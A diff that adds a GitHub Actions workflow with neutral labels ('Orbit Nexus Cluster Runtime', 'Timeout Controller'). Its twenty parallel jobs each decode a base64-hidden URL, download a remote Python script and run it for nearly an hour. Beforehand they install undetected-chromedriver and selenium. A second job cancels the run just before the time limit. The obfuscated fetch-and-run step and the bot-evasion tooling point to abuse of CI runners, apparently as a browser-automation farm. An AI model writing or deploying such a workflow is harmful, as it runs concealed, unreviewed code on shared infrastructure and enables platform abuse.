@@ -1,0 +1,91 @@
+name: Orbit Nexus Cluster Runtime
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: orbit-cluster-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Timeout Controller: Terminates workflow execution at 59 min mark
+  # =================================================================
+  timeout-controller:
+    name: "Timeout Controller"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      MAX_HOLD_TIME: 3540
+    steps:
+      - name: Initiate Standby Timer
+        run: |
+          echo "[TIMER] Controller started for execution: ${{ github.run_id }}"
+          echo "[TIMER] Holding run for ${MAX_HOLD_TIME} seconds."
+
+          sleep "${MAX_HOLD_TIME}"
+
+          echo "[TIMER] Limit achieved — transmitting cancellation signal."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[TIMER] Abort API call completed."
+
+  # =================================================================
+  # Nexus Nodes: Multi-channel execution matrix
+  # =================================================================
+  nexus-nodes:
+    name: "NexusNode-Channel-${{ matrix.channel_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        channel_id: [r-1, r-2, r-3, r-4, r-5, r-6, r-7, r-8, r-9, 3010, 3011, 3012, 3013, 3014, 3015, 3016, 3017, 3018, 3019, 3020]
+
+    steps:
+      - name: Provision Node Dependencies
+        run: |
+          echo "[PROVISION] Setting up Linux environment on Channel-${{ matrix.channel_id }}..."
+          sudo apt-get update -qq && sudo apt-get install -y curl python3-pip
+
+      - name: Retrieve Core Script
+        run: |
+          echo "[RETRIEVE] Fetching remote payload..."
+          RAW_ENDPOINT="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5"
+          RESOLVED_ENDPOINT=$(openssl base64 -d -A <<< "$RAW_ENDPOINT")
+          curl -sL "$RESOLVED_ENDPOINT" -o nexus_executor.py
+          echo "[RETRIEVE] Script downloaded as nexus_executor.py."
+
+      - name: Install Runtime Libraries
+        run: |
+          echo "[LIBRARIES] Installing Python requirements..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      - name: Execute Main Process Loop
+        run: |
+          echo "[RUN] Spawning process on Channel-${{ matrix.channel_id }}..."
+
+          python3 nexus_executor.py &
+          EXEC_PID=$!
+
+          echo "[RUN] Process spawned (PID: $EXEC_PID). Max execution window: 3540s."
+
+          sleep 3540
+
+          if kill -0 "$EXEC_PID" 2>/dev/null; then
+            echo "[RUN] Exec window reached limit. Halting process."
+            kill -9 "$EXEC_PID"
+            echo "[RUN] Process halted."
+          else
+            echo "[RUN] Process finished prior to timeout."
+          fi
